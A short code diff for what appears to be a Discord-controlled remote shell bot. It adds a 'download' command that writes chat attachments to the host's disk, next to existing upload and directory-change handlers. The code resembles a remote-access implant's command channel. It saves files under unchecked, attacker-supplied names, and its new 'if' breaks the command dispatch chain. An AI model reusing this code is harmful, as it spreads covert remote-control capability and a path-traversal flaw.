@@ -209,6 +209,10 @@ async def upload(filename):
             await channel.send("File is too big.")
 
 
+async def download(message, file):
+    await message.attachments[0].save(f"{file}")
+
+
 async def upload_chunks_from_memory(data):
     await channel.send("Splitting output and uploading chunks as "
                        "files, standby...")
@@ -296,6 +300,9 @@ async def shell_input(message):
     # Check if the message content starts with "upload"
     if message.content.startswith("upload"):
         await upload(message.content.split(" ")[1])
+
+    if message.content.startswith("download"):
+        await download(message, message.attachments[0].filename)
 
     elif message.content.startswith("cd"):
         # Change directories
